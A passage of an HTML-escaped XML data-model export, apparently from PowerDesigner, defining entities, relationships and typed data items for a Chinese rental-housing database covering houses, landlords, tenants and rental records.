Ref=&quot;o23&quot;/&gt;&lt;/c:DataItem&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o24&quot;&gt;&lt;a:ObjectID&gt;AE9DAA19-73C6-4ED9-993D-8AC65DF80478&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618315235&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618315463&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:BaseAttribute.Mandatory&gt;1&lt;/a:BaseAttribute.Mandatory&gt;&lt;c:DataItem&gt;&lt;o:DataItem Ref=&quot;o25&quot;/&gt;&lt;/c:DataItem&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o26&quot;&gt;&lt;a:ObjectID&gt;83591775-C27F-46DA-AB5A-FAB8C1006897&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618315235&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618315463&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:BaseAttribute.Mandatory&gt;1&lt;/a:BaseAttribute.Mandatory&gt;&lt;c:DataItem&gt;&lt;o:DataItem Ref=&quot;o27&quot;/&gt;&lt;/c:DataItem&gt;&lt;/o:EntityAttribute&gt;&lt;/c:Attributes&gt;&lt;/o:Entity&gt;&lt;o:Entity Id=&quot;o18&quot;&gt;&lt;a:ObjectID&gt;FDB75834-3BC6-4BEF-9B44-55D93226836C&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋&lt;/a:Name&gt;&lt;a:Code&gt;RoomInfo&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618315087&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618323493&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Identifiers&gt;&lt;o:Identifier Id=&quot;o28&quot;&gt;&lt;a:ObjectID&gt;F4555F5C-6216-4A26-9736-1CDF8EC09580&lt;/a:ObjectID&gt;&lt;a:Name&gt;Identifier_1&lt;/a:Name&gt;&lt;a:Code&gt;Identifier_1&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618315471&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618315688&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Identifier.Attributes&gt;&lt;o:EntityAttribute Ref=&quot;o29&quot;/&gt;&lt;/c:Identifier.Attributes&gt;&lt;/o:Identifier&gt;&lt;/c:Identifiers&gt;&lt;c:PrimaryIdentifier&gt;&lt;o:Identifier Ref=&quot;o28&quot;/&gt;&lt;/c:PrimaryIdentifier&gt;&lt;c:Attributes&gt;&lt;o:EntityAttribute Id=&quot;o29&quot;&gt;&lt;a:ObjectID&gt;C41A4BC7-929F-4BB9-BFDA-78B0883BC246&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618315471&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618315688&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:BaseAttribute.Mandatory&gt;1&lt;/a:BaseAttribute.Mandatory&gt;&lt;c:DataItem&gt;&lt;o:DataItem Ref=&quot;o30&quot;/&gt;&lt;/c:DataItem&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o31&quot;&gt;&lt;a:ObjectID&gt;FB014F6C-72FC-4D85-8E52-542C49888D04&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618315471&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618315688&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:BaseAttribute.Mandatory&gt;1&lt;/a:BaseAttribute.Mandatory&gt;&lt;c:DataItem&gt;&lt;o:DataItem Ref=&quot;o32&quot;/&gt;&lt;/c:DataItem&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o33&quot;&gt;&lt;a:ObjectID&gt;0BAAB45F-E7FB-47E9-A278-62E6267EA336&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618315471&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618315688&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:BaseAttribute.Mandatory&gt;1&lt;/a:BaseAttribute.Mandatory&gt;&lt;c:DataItem&gt;&lt;o:DataItem Ref=&quot;o34&quot;/&gt;&lt;/c:DataItem&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o35&quot;&gt;&lt;a:ObjectID&gt;19EE06BA-39BF-4617-A567-B720C2B86600&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618315471&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618315688&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:BaseAttribute.Mandatory&gt;1&lt;/a:BaseAttribute.Mandatory&gt;&lt;c:DataItem&gt;&lt;o:DataItem Ref=&quot;o36&quot;/&gt;&lt;/c:DataItem&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o37&quot;&gt;&lt;a:ObjectID&gt;341C6E5B-5EC0-43B5-8BFF-E0D230BDBE25&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618322959&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618323002&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:BaseAttribute.Mandatory&gt;1&lt;/a:BaseAttribute.Mandatory&gt;&lt;c:DataItem&gt;&lt;o:DataItem Ref=&quot;o38&quot;/&gt;&lt;/c:DataItem&gt;&lt;/o:EntityAttribute&gt;&lt;/c:Attributes&gt;&lt;/o:Entity&gt;&lt;o:Entity Id=&quot;o19&quot;&gt;&lt;a:ObjectID&gt;BDD7FF53-7C2F-4368-850F-95499E1A03FD&lt;/a:ObjectID&gt;&lt;a:Name&gt;房主信息&lt;/a:Name&gt;&lt;a:Code&gt;房主信息&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618319539&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618322930&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Identifiers&gt;&lt;o:Identifier Id=&quot;o39&quot;&gt;&lt;a:ObjectID&gt;3AF588EE-A26C-4BC1-9E65-DC4B4985582B&lt;/a:ObjectID&gt;&lt;a:Name&gt;Identifier_1&lt;/a:Name&gt;&lt;a:Code&gt;Identifier_1&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618319770&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618319811&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Identifier.Attributes&gt;&lt;o:EntityAttribute Ref=&quot;o40&quot;/&gt;&lt;/c:Identifier.Attributes&gt;&lt;/o:Identifier&gt;&lt;/c:Identifiers&gt;&lt;c:PrimaryIdentifier&gt;&lt;o:Identifier Ref=&quot;o39&quot;/&gt;&lt;/c:PrimaryIdentifier&gt;&lt;c:Attributes&gt;&lt;o:EntityAttribute Id=&quot;o40&quot;&gt;&lt;a:ObjectID&gt;5C62BF98-5A88-45D6-908F-575BE93621A6&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618319541&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618319811&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:BaseAttribute.Mandatory&gt;1&lt;/a:BaseAttribute.Mandatory&gt;&lt;c:DataItem&gt;&lt;o:DataItem Ref=&quot;o41&quot;/&gt;&lt;/c:DataItem&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o42&quot;&gt;&lt;a:ObjectID&gt;E57AA531-274B-4A22-BDB2-9A52917C1A3C&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618319541&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618319791&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:BaseAttribute.Mandatory&gt;1&lt;/a:BaseAttribute.Mandatory&gt;&lt;c:DataItem&gt;&lt;o:DataItem Ref=&quot;o43&quot;/&gt;&lt;/c:DataItem&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o44&quot;&gt;&lt;a:ObjectID&gt;081D5BD8-20C5-4545-8943-2D4E9F897AE7&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618319541&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618319791&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:BaseAttribute.Mandatory&gt;1&lt;/a:BaseAttribute.Mandatory&gt;&lt;c:DataItem&gt;&lt;o:DataItem Ref=&quot;o45&quot;/&gt;&lt;/c:DataItem&gt;&lt;/o:EntityAttribute&gt;&lt;/c:Attributes&gt;&lt;/o:Entity&gt;&lt;o:Entity Id=&quot;o20&quot;&gt;&lt;a:ObjectID&gt;A8F60995-E16F-403E-AEFB-70370F8C286A&lt;/a:ObjectID&gt;&lt;a:Name&gt;租用记录&lt;/a:Name&gt;&lt;a:Code&gt;租用记录&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618322365&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325122&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Identifiers&gt;&lt;o:Identifier Id=&quot;o46&quot;&gt;&lt;a:ObjectID&gt;0AC0CBDB-7ACA-4862-8171-53CF31A83543&lt;/a:ObjectID&gt;&lt;a:Name&gt;Identifier_1&lt;/a:Name&gt;&lt;a:Code&gt;Identifier_1&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618322486&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618322492&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Identifier.Attributes&gt;&lt;o:EntityAttribute Ref=&quot;o47&quot;/&gt;&lt;/c:Identifier.Attributes&gt;&lt;/o:Identifier&gt;&lt;/c:Identifiers&gt;&lt;c:PrimaryIdentifier&gt;&lt;o:Identifier Ref=&quot;o46&quot;/&gt;&lt;/c:PrimaryIdentifier&gt;&lt;c:Attributes&gt;&lt;o:EntityAttribute Id=&quot;o47&quot;&gt;&lt;a:ObjectID&gt;3840185E-0793-49E6-AF26-86AFB08D6295&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618322368&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618322492&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:BaseAttribute.Mandatory&gt;1&lt;/a:BaseAttribute.Mandatory&gt;&lt;c:DataItem&gt;&lt;o:DataItem Ref=&quot;o48&quot;/&gt;&lt;/c:DataItem&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o49&quot;&gt;&lt;a:ObjectID&gt;16C1834F-749B-4CBC-87BB-34D791C4BC51&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618322368&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618322492&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:BaseAttribute.Mandatory&gt;1&lt;/a:BaseAttribute.Mandatory&gt;&lt;c:DataItem&gt;&lt;o:DataItem Ref=&quot;o50&quot;/&gt;&lt;/c:DataItem&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o51&quot;&gt;&lt;a:ObjectID&gt;23C95933-4790-4780-BCBE-99A70D53756E&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618322368&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618322492&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:BaseAttribute.Mandatory&gt;1&lt;/a:BaseAttribute.Mandatory&gt;&lt;c:DataItem&gt;&lt;o:DataItem Ref=&quot;o52&quot;/&gt;&lt;/c:DataItem&gt;&lt;/o:EntityAttribute&gt;&lt;o:EntityAttribute Id=&quot;o53&quot;&gt;&lt;a:ObjectID&gt;9987D7A0-E0AA-4A05-94F0-E40C4B20B4E9&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618322368&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618322492&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:BaseAttribute.Mandatory&gt;1&lt;/a:BaseAttribute.Mandatory&gt;&lt;c:DataItem&gt;&lt;o:DataItem Ref=&quot;o54&quot;/&gt;&lt;/c:DataItem&gt;&lt;/o:EntityAttribute&gt;&lt;/c:Attributes&gt;&lt;/o:Entity&gt;&lt;/c:Entities&gt;&lt;c:Relationships&gt;&lt;o:Relationship Id=&quot;o8&quot;&gt;&lt;a:ObjectID&gt;40788EEB-C543-4C66-8BC9-4C0CE4D0A1B2&lt;/a:ObjectID&gt;&lt;a:Name&gt;租用1&lt;/a:Name&gt;&lt;a:Code&gt;租用1&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618322546&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618323511&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:Entity1ToEntity2RoleCardinality&gt;1,1&lt;/a:Entity1ToEntity2RoleCardinality&gt;&lt;a:Entity2ToEntity1RoleCardinality&gt;0,n&lt;/a:Entity2ToEntity1RoleCardinality&gt;&lt;c:Object1&gt;&lt;o:Entity Ref=&quot;o17&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:Entity Ref=&quot;o20&quot;/&gt;&lt;/c:Object2&gt;&lt;/o:Relationship&gt;&lt;o:Relationship Id=&quot;o11&quot;&gt;&lt;a:ObjectID&gt;B74ABDAE-7F8E-4DAA-BECE-67686B380E54&lt;/a:ObjectID&gt;&lt;a:Name&gt;租用2&lt;/a:Name&gt;&lt;a:Code&gt;租用2&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618322755&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618322885&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:Entity1ToEntity2RoleCardinality&gt;0,n&lt;/a:Entity1ToEntity2RoleCardinality&gt;&lt;a:Entity2ToEntity1RoleCardinality&gt;1,1&lt;/a:Entity2ToEntity1RoleCardinality&gt;&lt;c:Object1&gt;&lt;o:Entity Ref=&quot;o20&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:Entity Ref=&quot;o18&quot;/&gt;&lt;/c:Object2&gt;&lt;/o:Relationship&gt;&lt;o:Relationship Id=&quot;o14&quot;&gt;&lt;a:ObjectID&gt;EAB9668A-ADFE-4355-822B-2AAAEBE5E1E1&lt;/a:ObjectID&gt;&lt;a:Name&gt;拥有&lt;/a:Name&gt;&lt;a:Code&gt;拥有&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618322762&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618322930&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:Entity1ToEntity2RoleCardinality&gt;0,n&lt;/a:Entity1ToEntity2RoleCardinality&gt;&lt;a:Entity2ToEntity1RoleCardinality&gt;1,1&lt;/a:Entity2ToEntity1RoleCardinality&gt;&lt;c:Object1&gt;&lt;o:Entity Ref=&quot;o18&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:Entity Ref=&quot;o19&quot;/&gt;&lt;/c:Object2&gt;&lt;/o:Relationship&gt;&lt;o:Relationship Id=&quot;o16&quot;&gt;&lt;a:ObjectID&gt;D4FD4412-8743-4AEA-B773-42465813A721&lt;/a:ObjectID&gt;&lt;a:Name&gt;预定&lt;/a:Name&gt;&lt;a:Code&gt;预定&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618323460&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618323493&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:Entity1ToEntity2RoleCardinality&gt;0,n&lt;/a:Entity1ToEntity2RoleCardinality&gt;&lt;a:Entity2ToEntity1RoleCardinality&gt;0,n&lt;/a:Entity2ToEntity1RoleCardinality&gt;&lt;c:Object1&gt;&lt;o:Entity Ref=&quot;o18&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:Entity Ref=&quot;o17&quot;/&gt;&lt;/c:Object2&gt;&lt;/o:Relationship&gt;&lt;/c:Relationships&gt;&lt;c:DataItems&gt;&lt;o:DataItem Id=&quot;o23&quot;&gt;&lt;a:ObjectID&gt;BC0700F7-FC32-4DC5-82C7-C7E14A60A4B5&lt;/a:ObjectID&gt;&lt;a:Name&gt;身份证&lt;/a:Name&gt;&lt;a:Code&gt;IDNum&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618315089&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618315463&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;VA18&lt;/a:DataType&gt;&lt;a:Length&gt;18&lt;/a:Length&gt;&lt;/o:DataItem&gt;&lt;o:DataItem Id=&quot;o25&quot;&gt;&lt;a:ObjectID&gt;C2A98A8D-733B-4F3E-8EB8-77C29D71BEE7&lt;/a:ObjectID&gt;&lt;a:Name&gt;租客姓名&lt;/a:Name&gt;&lt;a:Code&gt;RenterName&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618315235&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618315463&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;VA20&lt;/a:DataType&gt;&lt;a:Length&gt;20&lt;/a:Length&gt;&lt;/o:DataItem&gt;&lt;o:DataItem Id=&quot;o27&quot;&gt;&lt;a:ObjectID&gt;9E8E2B8E-321A-4540-8A70-8E44949AFFCA&lt;/a:ObjectID&gt;&lt;a:Name&gt;租客电话&lt;/a:Name&gt;&lt;a:Code&gt;RenterTel&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618315235&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618315463&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;VA11&lt;/a:DataType&gt;&lt;a:Length&gt;11&lt;/a:Length&gt;&lt;/o:DataItem&gt;&lt;o:DataItem Id=&quot;o30&quot;&gt;&lt;a:ObjectID&gt;55BE08DE-9FE0-43D6-AD55-870AA017C140&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋编号&lt;/a:Name&gt;&lt;a:Code&gt;房屋编号&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618315471&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325058&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;NO&lt;/a:DataType&gt;&lt;/o:DataItem&gt;&lt;o:DataItem Id=&quot;o32&quot;&gt;&lt;a:ObjectID&gt;ED390980-5212-4983-A426-75D5291E7FBC&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋地址&lt;/a:Name&gt;&lt;a:Code&gt;房屋地址&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618315471&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325058&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;VA20&lt;/a:DataType&gt;&lt;a:Length&gt;20&lt;/a:Length&gt;&lt;/o:DataItem&gt;&lt;o:DataItem Id=&quot;o34&quot;&gt;&lt;a:ObjectID&gt;49378BF2-A62A-406F-9B4C-714B6A3737D9&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋类型&lt;/a:Name&gt;&lt;a:Code&gt;房屋类型&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618315471&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325058&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;VA20&lt;/a:DataType&gt;&lt;a:Length&gt;20&lt;/a:Length&gt;&lt;/o:DataItem&gt;&lt;o:DataItem Id=&quot;o36&quot;&gt;&lt;a:ObjectID&gt;79931F12-B084-4A22-B8AD-8FEFD8586B0B&lt;/a:ObjectID&gt;&lt;a:Name&gt;每月基本房租&lt;/a:Name&gt;&lt;a:Code&gt;每月基本房租&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618315471&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325058&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;MN&lt;/a:DataType&gt;&lt;/o:DataItem&gt;&lt;o:DataItem Id=&quot;o41&quot;&gt;&lt;a:ObjectID&gt;C0002784-00D0-4986-B2DD-CCE859B2E5EF&lt;/a:ObjectID&gt;&lt;a:Name&gt;房主身份证号&lt;/a:Name&gt;&lt;a:Code&gt;房主身份证号&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618319541&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325143&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;VA18&lt;/a:DataType&gt;&lt;a:Length&gt;18&lt;/a:Length&gt;&lt;/o:DataItem&gt;&lt;o:DataItem Id=&quot;o43&quot;&gt;&lt;a:ObjectID&gt;AE60AE80-D61D-437E-81D7-86A4132565B1&lt;/a:ObjectID&gt;&lt;a:Name&gt;房主姓名&lt;/a:Name&gt;&lt;a:Code&gt;房主姓名&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618319541&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325143&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;VA20&lt;/a:DataType&gt;&lt;a:Length&gt;20&lt;/a:Length&gt;&lt;/o:DataItem&gt;&lt;o:DataItem Id=&quot;o45&quot;&gt;&lt;a:ObjectID&gt;1CD0865C-838B-425A-A914-7C84414F61E0&lt;/a:ObjectID&gt;&lt;a:Name&gt;房主电话&lt;/a:Name&gt;&lt;a:Code&gt;房主电话&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618319541&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325143&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;VA11&lt;/a:DataType&gt;&lt;a:Length&gt;11&lt;/a:Length&gt;&lt;/o:DataItem&gt;&lt;o:DataItem Id=&quot;o48&quot;&gt;&lt;a:ObjectID&gt;DDE2BC9A-A475-4E41-B5B4-25A62591E728&lt;/a:ObjectID&gt;&lt;a:Name&gt;租用流水号&lt;/a:Name&gt;&lt;a:Code&gt;租用流水号&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618322368&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325075&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;NO&lt;/a:DataType&gt;&lt;/o:DataItem&gt;&lt;o:DataItem Id=&quot;o50&quot;&gt;&lt;a:ObjectID&gt;1049EC33-6F90-43E6-B4E4-64DEDFC85911&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋租用时间&lt;/a:Name&gt;&lt;a:Code&gt;房屋租用时间&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618322368&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325122&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;D&lt;/a:DataType&gt;&lt;/o:DataItem&gt;&lt;o:DataItem Id=&quot;o52&quot;&gt;&lt;a:ObjectID&gt;CB4C6B40-ACA4-4B94-9223-5A94771428CE&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋到期时间&lt;/a:Name&gt;&lt;a:Code&gt;房屋到期时间&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618322368&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325122&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;D&lt;/a:DataType&gt;&lt;/o:DataItem&gt;&lt;o:DataItem Id=&quot;o54&quot;&gt;&lt;a:ObjectID&gt;EEF6A449-E891-4086-A370-C8DC33072B41&lt;/a:ObjectID&gt;&lt;a:Name&gt;付款金额&lt;/a:Name&gt;&lt;a:Code&gt;付款金额&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618322368&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325122&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;MN&lt;/a:DataType&gt;&lt;/o:DataItem&gt;&lt;o:DataItem Id=&quot;o38&quot;&gt;&lt;a:ObjectID&gt;B4590363-5E3C-4D63-B4E9-D3979306DF4B&lt;/a:ObjectID&gt;&lt;a:Name&gt;是否空闲&lt;/a:Name&gt;&lt;a:Code&gt;是否空闲&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618322959&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618325058&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;BL&lt;/a:DataType&gt;&lt;/o:DataItem&gt;&lt;/c:DataItems&gt;&lt;c:TargetModels&gt;&lt;o:TargetModel 